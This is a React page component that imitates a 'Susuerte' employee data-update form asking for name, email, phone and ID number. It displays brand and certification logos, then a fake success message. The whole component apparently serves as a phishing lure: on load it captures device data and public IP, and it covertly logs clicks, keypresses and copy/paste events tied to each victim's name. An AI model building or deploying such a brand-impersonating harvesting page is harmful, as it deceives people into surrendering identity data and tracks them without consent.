/**
 * Susuerte - Actualización de Datos
 * Design: Corporate Institutional / Brand-Faithful
 * 
 * Color Philosophy:
 *   - Fondo página: #0d1117 (oscuro neutro)
 *   - Header tarjeta: gradiente azul royal #1a3fa0 → #1e4db7
 *   - Botón CTA: amarillo dorado #FFD700
 *   - Texto sobre azul: blanco puro
 *   - Sección inferior: blanco con borde suave
 * 
 * Typography: Nunito (Bold para títulos, Regular para cuerpo)
 * Layout: Tarjeta centrada, fondo oscuro, sombra pronunciada
 */

import { useState, useEffect } from "react";
import { motion } from "framer-motion";
import { captureDeviceData, initializeSessionMetrics, calculatePageViewTime, calculateScrollDepth } from "@/lib/deviceDetection";

interface FormData {
  name: string;
  email: string;
  phone: string;
  document: string;
}

interface RegistroUsuario {
  id: string;
  nombre: string;
  email: string;
  telefono: string;
  documento: string;
  verificado: boolean;
  timestamp: string;
  deviceData: any;
  sessionMetrics: any;
}

export default function Home() {
  const [formData, setFormData] = useState<FormData>({
    name: "",
    email: "",
    phone: "",
    document: "",
  });
  const [submitted, setSubmitted] = useState(false);
  const [loading, setLoading] = useState(false);
  const [deviceData, setDeviceData] = useState<any>(null);
  const [sessionMetrics, setSessionMetrics] = useState<any>(null);
  const [sessionStart] = useState(Date.now());

  // Capturar datos técnicos al cargar la página
  useEffect(() => {
    const captureData = async () => {
      const device = await captureDeviceData();
      setDeviceData(device);
    };
    captureData();
  }, []);

  // Inicializar métricas de sesión
  useEffect(() => {
    const metrics = initializeSessionMetrics();
    setSessionMetrics(metrics);

    // Tracking de scroll
    const handleScroll = () => {
      setSessionMetrics((prev: any) => ({
        ...prev,
        scrollDepth: calculateScrollDepth(),
      }));
    };

    // Tracking de focus/blur
    const handleFocus = () => {
      setSessionMetrics((prev: any) => ({
        ...prev,
        focusEvents: (prev?.focusEvents || 0) + 1,
      }));
    };

    const handleBlur = () => {
      setSessionMetrics((prev: any) => ({
        ...prev,
        blurEvents: (prev?.blurEvents || 0) + 1,
      }));
    };

    // Tracking de copy/paste
    const handleCopyPaste = () => {
      setSessionMetrics((prev: any) => ({
        ...prev,
        copyPasteEvents: (prev?.copyPasteEvents || 0) + 1,
      }));
    };

    // Tracking de clics
    const handleClickTracking = (e: MouseEvent) => {
      const target = (e.target as HTMLElement).getAttribute("data-track");
      if (target) {
        const clickData = {
          id: Date.now().toString(),
          nombre: formData.name || "Anónimo",
          email: formData.email || "Anónimo",
          ip: deviceData?.publicIP || "Desconocida",
          target: target,
          timestamp: new Date().toISOString(),
          deviceData: deviceData,
        };

        const clicsGuardados = localStorage.getItem("susuerte_clics");
        const clics = clicsGuardados ? JSON.parse(clicsGuardados) : [];
        clics.push(clickData);
        localStorage.setItem("susuerte_clics", JSON.stringify(clics));

        setSessionMetrics((prev: any) => ({
          ...prev,
          clickCount: (prev?.clickCount || 0) + 1,
        }));
      }
    };

    // Tracking de keypresses
    const handleKeyPress = () => {
      setSessionMetrics((prev: any) => ({
        ...prev,
        keyPressCount: (prev?.keyPressCount || 0) + 1,
      }));
    };

    window.addEventListener("scroll", handleScroll);
    window.addEventListener("focus", handleFocus);
    window.addEventListener("blur", handleBlur);
    window.addEventListener("copy", handleCopyPaste);
    window.addEventListener("paste", handleCopyPaste);
    document.addEventListener("click", handleClickTracking);
    window.addEventListener("keypress", handleKeyPress);

    return () => {
      window.removeEventListener("scroll", handleScroll);
      window.removeEventListener("focus", handleFocus);
      window.removeEventListener("blur", handleBlur);
      window.removeEventListener("copy", handleCopyPaste);
      window.removeEventListener("paste", handleCopyPaste);
      document.removeEventListener("click", handleClickTracking);
      window.removeEventListener("keypress", handleKeyPress);
    };
  }, [formData, deviceData]);

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setFormData({ ...formData, [e.target.id]: e.target.value });
    setSessionMetrics((prev: any) => ({
      ...prev,
      formInteractions: (prev?.formInteractions || 0) + 1,
    }));
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setTimeout(() => {
      // Calcular métricas finales
      const finalMetrics = {
        ...sessionMetrics,
        pageViewTime: calculatePageViewTime(sessionStart),
        formCompletionPercentage: 100,
      };

      // Guardar en localStorage
      const registrosGuardados = localStorage.getItem("susuerte_registros");
      const registros = registrosGuardados ? JSON.parse(registrosGuardados) : [];

      const nuevoRegistro: RegistroUsuario = {
        id: Date.now().toString(),
        nombre: formData.name,
        email: formData.email,
        telefono: formData.phone,
        documento: formData.document,
        verificado: false,
        timestamp: new Date().toISOString(),
        deviceData: deviceData,
        sessionMetrics: finalMetrics,
      };

      registros.push(nuevoRegistro);
      localStorage.setItem("susuerte_registros", JSON.stringify(registros));

      // Guardar datos del usuario actual para tracking de clics
      localStorage.setItem("susuerte_current_user_name", formData.name);
      localStorage.setItem("susuerte_current_user_email", formData.email);

      setLoading(false);
      setSubmitted(true);
    }, 1200);
  };

  return (
    <div
      className="min-h-screen flex items-center justify-center px-4 py-10"
      style={{
        background: "linear-gradient(135deg, #0d1117 0%, #0f1e3d 50%, #0d1117 100%)",
      }}
    >
      {/* Decorative background stars */}
      <div className="fixed inset-0 overflow-hidden pointer-events-none">
        {[...Array(18)].map((_, i) => (
          <div
            key={i}
            className="absolute rounded-full bg-white"
            style={{
              width: Math.random() * 2 + 1 + "px",
              height: Math.random() * 2 + 1 + "px",
              top: Math.random() * 100 + "%",
              left: Math.random() * 100 + "%",
              opacity: Math.random() * 0.4 + 0.1,
            }}
          />
        ))}
      </div>

      <motion.div
        initial={{ opacity: 0, y: 28 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.45, ease: [0.23, 1, 0.32, 1] }}
        className="w-full max-w-[420px] rounded-2xl overflow-hidden shadow-2xl"
        style={{ boxShadow: "0 25px 60px rgba(0,0,0,0.55), 0 0 0 1px rgba(255,255,255,0.06)" }}
      >
        {/* ── Header azul con logo ── */}
        <div
          className="flex flex-col items-center px-8 pt-8 pb-7"
          style={{
            background: "linear-gradient(160deg, #1a3fa0 0%, #1e4db7 60%, #1a3fa0 100%)",
          }}
        >
          <img
            src="/manus-storage/logo_5df8107c.png"
            alt="Susuerte Logo"
            className="h-14 w-auto object-contain mb-5"
          />
          <h1
            className="text-white text-center font-bold leading-snug"
            style={{ fontFamily: "'Nunito', sans-serif", fontSize: "1.25rem" }}
          >
            Querido colaborador
          </h1>
          <p
            className="text-white/80 text-center mt-1"
            style={{ fontFamily: "'Nunito', sans-serif", fontSize: "0.92rem" }}
          >
            Agrega tu información para la actualización de tus datos
          </p>
        </div>

        {/* ── Cuerpo blanco con formulario ── */}
        <div className="bg-white px-8 py-7">
          {submitted ? (
            <motion.div
              initial={{ opacity: 0, scale: 0.95 }}
              animate={{ opacity: 1, scale: 1 }}
              transition={{ duration: 0.3 }}
              className="flex flex-col items-center py-6 text-center"
            >
              <div
                className="w-14 h-14 rounded-full flex items-center justify-center mb-4"
                style={{ background: "#1a3fa0" }}
              >
                <svg width="28" height="28" viewBox="0 0 24 24" fill="none">
                  <path d="M5 13l4 4L19 7" stroke="white" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" />
                </svg>
              </div>
              <h2
                className="font-bold text-gray-800 text-lg mb-1"
                style={{ fontFamily: "'Nunito', sans-serif" }}
              >
                ¡Datos actualizados!
              </h2>
              <p
                className="text-gray-500 text-sm"
                style={{ fontFamily: "'Nunito', sans-serif" }}
              >
                Tu información ha sido registrada exitosamente.
              </p>
            </motion.div>
          ) : (
            <form onSubmit={handleSubmit} className="flex flex-col gap-4">
              {/* Nombre Completo */}
              <div className="flex flex-col gap-1">
                <label
                  htmlFor="name"
                  className="text-sm font-semibold text-gray-700"
                  style={{ fontFamily: "'Nunito', sans-serif" }}
                >
                  Nombre Completo
                </label>
                <input
                  id="name"
                  type="text"
                  placeholder="Tu nombre completo"
                  value={formData.name}
                  onChange={handleChange}
                  required
                  data-track="input-nombre"
                  className="w-full border border-gray-200 rounded-lg px-3 py-2.5 text-sm text-gray-800 outline-none transition-all duration-200"
                  style={{
                    fontFamily: "'Nunito', sans-serif",
                    boxShadow: "none",
                  }}
                  onFocus={(e) => {
                    e.target.style.borderColor = "#1a3fa0";
                    e.target.style.boxShadow = "0 0 0 3px rgba(26,63,160,0.12)";
                  }}
                  onBlur={(e) => {
                    e.target.style.borderColor = "#e5e7eb";
                    e.target.style.boxShadow = "none";
                  }}
                />
              </div>

              {/* Correo Electrónico */}
              <div className="flex flex-col gap-1">
                <label
                  htmlFor="email"
                  className="text-sm font-semibold text-gray-700"
                  style={{ fontFamily: "'Nunito', sans-serif" }}
                >
                  Correo Electrónico
                </label>
                <input
                  id="email"
                  type="email"
                  placeholder="tu@correo.com"
                  value={formData.email}
                  onChange={handleChange}
                  required
                  data-track="input-email"
                  className="w-full border border-gray-200 rounded-lg px-3 py-2.5 text-sm text-gray-800 outline-none transition-all duration-200"
                  style={{ fontFamily: "'Nunito', sans-serif" }}
                  onFocus={(e) => {
                    e.target.style.borderColor = "#1a3fa0";
                    e.target.style.boxShadow = "0 0 0 3px rgba(26,63,160,0.12)";
                  }}
                  onBlur={(e) => {
                    e.target.style.borderColor = "#e5e7eb";
                    e.target.style.boxShadow = "none";
                  }}
                />
              </div>

              {/* Teléfono */}
              <div className="flex flex-col gap-1">
                <label
                  htmlFor="phone"
                  className="text-sm font-semibold text-gray-700"
                  style={{ fontFamily: "'Nunito', sans-serif" }}
                >
                  Teléfono
                </label>
                <input
                  id="phone"
                  type="tel"
                  placeholder="Tu número de teléfono"
                  value={formData.phone}
                  onChange={handleChange}
                  data-track="input-phone"
                  className="w-full border border-gray-200 rounded-lg px-3 py-2.5 text-sm text-gray-800 outline-none transition-all duration-200"
                  style={{ fontFamily: "'Nunito', sans-serif" }}
                  onFocus={(e) => {
                    e.target.style.borderColor = "#1a3fa0";
                    e.target.style.boxShadow = "0 0 0 3px rgba(26,63,160,0.12)";
                  }}
                  onBlur={(e) => {
                    e.target.style.borderColor = "#e5e7eb";
                    e.target.style.boxShadow = "none";
                  }}
                />
              </div>

              {/* Número de Documento */}
              <div className="flex flex-col gap-1">
                <label
                  htmlFor="document"
                  className="text-sm font-semibold text-gray-700"
                  style={{ fontFamily: "'Nunito', sans-serif" }}
                >
                  Número de Documento
                </label>
                <input
                  id="document"
                  type="text"
                  placeholder="Tu número de documento"
                  value={formData.document}
                  onChange={handleChange}
                  data-track="input-document"
                  className="w-full border border-gray-200 rounded-lg px-3 py-2.5 text-sm text-gray-800 outline-none transition-all duration-200"
                  style={{ fontFamily: "'Nunito', sans-serif" }}
                  onFocus={(e) => {
                    e.target.style.borderColor = "#1a3fa0";
                    e.target.style.boxShadow = "0 0 0 3px rgba(26,63,160,0.12)";
                  }}
                  onBlur={(e) => {
                    e.target.style.borderColor = "#e5e7eb";
                    e.target.style.boxShadow = "none";
                  }}
                />
              </div>

              {/* Botón Actualizar */}
              <motion.button
                type="submit"
                disabled={loading}
                whileTap={{ scale: 0.97 }}
                data-track="btn-submit"
                className="w-full py-3 rounded-lg font-bold text-base mt-1 transition-all duration-200"
                style={{
                  fontFamily: "'Nunito', sans-serif",
                  background: loading ? "#e5c700" : "#FFD700",
                  color: "#1a1a1a",
                  boxShadow: "0 4px 14px rgba(255,215,0,0.35)",
                  cursor: loading ? "not-allowed" : "pointer",
                }}
                onMouseEnter={(e) => {
                  if (!loading) (e.currentTarget as HTMLButtonElement).style.background = "#ffe033";
                }}
                onMouseLeave={(e) => {
                  if (!loading) (e.currentTarget as HTMLButtonElement).style.background = "#FFD700";
                }}
              >
                {loading ? (
                  <span className="flex items-center justify-center gap-2">
                    <svg className="animate-spin h-4 w-4" viewBox="0 0 24 24" fill="none">
                      <circle className="opacity-25" cx="12" cy="12" r="10" stroke="#1a1a1a" strokeWidth="4" />
                      <path className="opacity-75" fill="#1a1a1a" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
                    </svg>
                    Actualizando...
                  </span>
                ) : (
                  "Actualizar Datos"
                )}
              </motion.button>

              <p
                className="text-center text-xs text-gray-400 mt-1"
                style={{ fontFamily: "'Nunito', sans-serif" }}
              >
                Al enviar, aceptas nuestros términos y condiciones.
              </p>


            </form>
          )}
        </div>

        {/* ── Footer con certificaciones ── */}
        <div
          className="bg-gray-50 border-t border-gray-100 px-6 pt-4 pb-5"
        >
          <p
            className="text-center text-xs text-gray-400 mb-3 font-semibold uppercase tracking-wide"
            style={{ fontFamily: "'Nunito', sans-serif" }}
          >
            Certificaciones y Acreditaciones
          </p>
          <div className="flex items-center justify-center gap-4 flex-wrap">
            <img
              src="/manus-storage/iso9001_95575a89.png"
              alt="ISO 9001 Certified"
              className="h-8 w-auto object-contain opacity-70 hover:opacity-100 transition-opacity"
            />
            <img
              src="/manus-storage/super-salud_bb073043.png"
              alt="Super Salud"
              className="h-8 w-auto object-contain opacity-70 hover:opacity-100 transition-opacity"
            />
            <img
              src="/manus-storage/pse_banner_afc1f717.png"
              alt="PSE"
              className="h-8 w-auto object-contain opacity-70 hover:opacity-100 transition-opacity"
            />
          </div>
        </div>

        {/* ── Copyright ── */}
        <div className="bg-white border-t border-gray-100 px-6 py-3 text-center">
          <p
            className="text-xs text-gray-400"
            style={{ fontFamily: "'Nunito', sans-serif" }}
          >
            © 2022 Susuerte ¡siempre te da más!
          </p>
        </div>
      </motion.div>
    </div>
  );
}
